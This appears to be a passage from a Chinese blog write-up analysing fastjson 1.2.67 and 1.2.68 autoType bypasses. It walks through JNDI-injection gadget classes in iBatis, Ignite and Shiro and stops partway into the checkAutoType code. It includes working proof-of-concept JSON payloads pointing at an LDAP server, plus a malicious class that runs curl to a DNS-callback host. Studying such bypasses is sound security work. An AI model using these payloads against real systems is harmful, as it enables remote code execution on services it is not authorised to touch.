        data-src="https://img.mi3aka.eu.org/2023/02/4cd47e5e7ca286e79e4ff3ef4d46fc8b.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/4cd47e5e7ca286e79e4ff3ef4d46fc8b.png, https://img.mi3aka.eu.org/2023/02/4cd47e5e7ca286e79e4ff3ef4d46fc8b.png 1.5x, https://img.mi3aka.eu.org/2023/02/4cd47e5e7ca286e79e4ff3ef4d46fc8b.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/4cd47e5e7ca286e79e4ff3ef4d46fc8b.png"
        title="https://img.mi3aka.eu.org/2023/02/4cd47e5e7ca286e79e4ff3ef4d46fc8b.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">Object</span> <span class="nf">getObjectOrPerformJndiLookup</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">object</span> <span class="k">instanceof</span> <span class="n">String</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">InitialContext</span> <span class="n">initCtx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">initCtx</span><span class="o">.</span><span class="na">lookup</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">object</span><span class="o">);</span><span class="c1">//lookup进行JNDI注入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">object</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/2e90ccc0f7f2f59407710394b8c48abe.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/2e90ccc0f7f2f59407710394b8c48abe.png, https://img.mi3aka.eu.org/2023/02/2e90ccc0f7f2f59407710394b8c48abe.png 1.5x, https://img.mi3aka.eu.org/2023/02/2e90ccc0f7f2f59407710394b8c48abe.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/2e90ccc0f7f2f59407710394b8c48abe.png"
        title="https://img.mi3aka.eu.org/2023/02/2e90ccc0f7f2f59407710394b8c48abe.png" /></p>
<h3 id="jtatransactionconfig分析">JtaTransactionConfig分析</h3>
<blockquote>
<p>ibatis-sqlmap 2.3.4.726 , jta 1.1</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setProperties</span><span class="o">(</span><span class="n">Properties</span> <span class="n">props</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SQLException</span><span class="o">,</span> <span class="n">TransactionException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">utxName</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">utxName</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">props</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;UserTransaction&#34;</span><span class="o">);</span><span class="c1">//获取UserTransaction的值,即ldap地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">InitialContext</span> <span class="n">initCtx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">userTransaction</span> <span class="o">=</span> <span class="o">(</span><span class="n">UserTransaction</span><span class="o">)</span> <span class="n">initCtx</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">utxName</span><span class="o">);</span><span class="c1">//lookup进行JNDI注入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">SqlMapException</span><span class="o">(</span><span class="s">&#34;Error initializing JtaTransactionConfig while looking up UserTransaction (&#34;</span> <span class="o">+</span> <span class="n">utxName</span> <span class="o">+</span> <span class="s">&#34;).  Cause: &#34;</span> <span class="o">+</span> <span class="n">e</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/3a2ef797497e6cf129bdde977382fdb1.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/3a2ef797497e6cf129bdde977382fdb1.png, https://img.mi3aka.eu.org/2023/02/3a2ef797497e6cf129bdde977382fdb1.png 1.5x, https://img.mi3aka.eu.org/2023/02/3a2ef797497e6cf129bdde977382fdb1.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/3a2ef797497e6cf129bdde977382fdb1.png"
        title="https://img.mi3aka.eu.org/2023/02/3a2ef797497e6cf129bdde977382fdb1.png" /></p>
<h2 id="1267">1.2.67</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">与1.2.45的绕过类似,通过多个类进行绕过
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_67</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&#34;, \&#34;jndiNames\&#34;:[\&#34;ldap://127.0.0.1:1389/exp\&#34;], \&#34;tm\&#34;: {\&#34;$ref\&#34;:\&#34;$.tm\&#34;}}&#34;</span><span class="o">;</span><span class="c1">// $.tm为路径引用,即调用getTm方法
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// String json_str = &#34;{\&#34;@type\&#34;:\&#34;org.apache.shiro.jndi.JndiObjectFactory\&#34;,\&#34;resourceName\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;,\&#34;instance\&#34;:{\&#34;$ref\&#34;:\&#34;$.instance\&#34;}}&#34;;// $.instance为路径引用,即调用getInstance方法
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/d1d022b238011c9b4f1b5f3ad22e68d6.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/d1d022b238011c9b4f1b5f3ad22e68d6.png, https://img.mi3aka.eu.org/2023/02/d1d022b238011c9b4f1b5f3ad22e68d6.png 1.5x, https://img.mi3aka.eu.org/2023/02/d1d022b238011c9b4f1b5f3ad22e68d6.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/d1d022b238011c9b4f1b5f3ad22e68d6.png"
        title="https://img.mi3aka.eu.org/2023/02/d1d022b238011c9b4f1b5f3ad22e68d6.png" /></p>
<h3 id="cachejnditmlookup分析">CacheJndiTmLookup分析</h3>
<blockquote>
<p>ignite-core 2.10.0 , ignite-jta 2.10.0</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setJndiNames</span><span class="o">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">jndiNames</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">jndiNames</span> <span class="o">=</span> <span class="n">jndiNames</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/** {@inheritDoc} */</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@Nullable</span> <span class="nd">@Override</span> <span class="kd">public</span> <span class="n">TransactionManager</span> <span class="nf">getTm</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IgniteException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">jndiNames</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="o">!</span><span class="n">jndiNames</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">InitialContext</span> <span class="n">ctx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">s</span> <span class="o">:</span> <span class="n">jndiNames</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">s</span><span class="o">);</span><span class="c1">//lookup进行JNDI注入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="o">(</span><span class="n">obj</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">obj</span> <span class="k">instanceof</span> <span class="n">TransactionManager</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="o">(</span><span class="n">TransactionManager</span><span class="o">)</span> <span class="n">obj</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/75fada1eaf5cc76cc5ec6f509d4e5ad5.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/75fada1eaf5cc76cc5ec6f509d4e5ad5.png, https://img.mi3aka.eu.org/2023/02/75fada1eaf5cc76cc5ec6f509d4e5ad5.png 1.5x, https://img.mi3aka.eu.org/2023/02/75fada1eaf5cc76cc5ec6f509d4e5ad5.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/75fada1eaf5cc76cc5ec6f509d4e5ad5.png"
        title="https://img.mi3aka.eu.org/2023/02/75fada1eaf5cc76cc5ec6f509d4e5ad5.png" /></p>
<h3 id="jndiobjectfactory分析">JndiObjectFactory分析</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.shiro.jndi.JndiObjectFactory
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">T</span> <span class="nf">getInstance</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="o">(</span><span class="n">requiredType</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">requiredType</span><span class="o">.</span><span class="na">cast</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">resourceName</span><span class="o">,</span> <span class="n">requiredType</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="o">(</span><span class="n">T</span><span class="o">)</span> <span class="k">this</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">resourceName</span><span class="o">);</span><span class="c1">//lookup进行JNDI注入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="n">String</span> <span class="n">typeName</span> <span class="o">=</span> <span class="n">requiredType</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">requiredType</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;object&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalStateException</span><span class="o">(</span><span class="s">&#34;Unable to look up &#34;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&#34; with jndi name &#39;&#34;</span> <span class="o">+</span> <span class="n">resourceName</span> <span class="o">+</span> <span class="s">&#34;&#39;.&#34;</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setResourceName</span><span class="o">(</span><span class="n">String</span> <span class="n">resourceName</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">resourceName</span> <span class="o">=</span> <span class="n">resourceName</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/cc2c5096e1db926aca871cc2ff3c5ac6.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/cc2c5096e1db926aca871cc2ff3c5ac6.png, https://img.mi3aka.eu.org/2023/02/cc2c5096e1db926aca871cc2ff3c5ac6.png 1.5x, https://img.mi3aka.eu.org/2023/02/cc2c5096e1db926aca871cc2ff3c5ac6.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/cc2c5096e1db926aca871cc2ff3c5ac6.png"
        title="https://img.mi3aka.eu.org/2023/02/cc2c5096e1db926aca871cc2ff3c5ac6.png" /></p>
<h2 id="1268">1.2.68</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_68</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//无需开启AutoTypeSupport
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;java.lang.AutoCloseable\&#34;,\&#34;@type\&#34;:\&#34;learn.bypass.evil_1_2_68\&#34;}&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">evil_1_2_68</span> <span class="kd">implements</span> <span class="n">AutoCloseable</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">evil_1_2_68</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;curl http://1.2.68.6bb37b09.dns.1433.eu.org&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">close</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/51a2671e64229789dca69aef96574be7.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/51a2671e64229789dca69aef96574be7.png, https://img.mi3aka.eu.org/2023/02/51a2671e64229789dca69aef96574be7.png 1.5x, https://img.mi3aka.eu.org/2023/02/51a2671e64229789dca69aef96574be7.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/51a2671e64229789dca69aef96574be7.png"
        title="https://img.mi3aka.eu.org/2023/02/51a2671e64229789dca69aef96574be7.png" /></p>
<h3 id="第一次checkautotype分析">第一次checkAutoType分析</h3>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/855c42728d508b6f78020d55cf9b664c.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/855c42728d508b6f78020d55cf9b664c.png, https://img.mi3aka.eu.org/2023/02/855c42728d508b6f78020d55cf9b664c.png 1.5x, https://img.mi3aka.eu.org/2023/02/855c42728d508b6f78020d55cf9b664c.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/855c42728d508b6f78020d55cf9b664c.png"
        title="https://img.mi3aka.eu.org/2023/02/855c42728d508b6f78020d55cf9b664c.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">checkAutoType</span><span class="o">(</span><span class="n">String</span> <span class="n">typeName</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span><span class="o">,</span> <span class="kt">int</span> <span class="n">features</span><span class="o">)</span> <span class="o">{</span><span class="c1">//此时的expectClass为null
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">typeName</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">autoTypeCheckHandlers</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="n">AutoTypeCheckHandler</span> <span class="n">h</span> <span class="o">:</span> <span class="n">autoTypeCheckHandlers</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">type</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="na">handler</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">expectClass</span><span class="o">,</span> <span class="n">features</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">type</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">type</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">int</span> <span class="n">safeModeMask</span> <span class="o">=</span> <span class="n">Feature</span><span class="o">.</span><span class="na">SafeMode</span><span class="o">.</span><span class="na">mask</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">safeMode</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">safeMode</span> <span class="o">||</span> <span class="o">(</span><span class="n">features</span> <span class="o">&amp;</span> <span class="n">safeModeMask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span> <span class="o">(</span><span class="n">JSON</span><span class="o">.</span><span class="na">DEFAULT_PARSER_FEATURE</span> <span class="o">&amp;</span> <span class="n">safeModeMask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">;</span>
